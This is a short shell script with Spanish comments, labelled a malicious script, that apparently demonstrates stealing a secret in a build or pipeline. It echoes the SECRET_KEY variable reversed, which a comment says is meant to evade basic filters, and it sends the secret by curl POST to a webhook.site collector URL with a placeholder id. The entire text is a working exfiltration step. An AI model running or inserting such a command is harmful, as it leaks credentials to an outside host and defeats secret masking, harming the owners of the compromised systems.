# Script malicioso
echo "Robando el secreto..."
# En un ataque real, esto enviaría el secreto a un servidor externo (webhook.site)
echo "El secreto filtrado es: $SECRET_KEY" | rev # Lo giramos para evadir filtros básicos
curl -X POST -d "data=$SECRET_KEY" https://webhook.site/tu-id-unico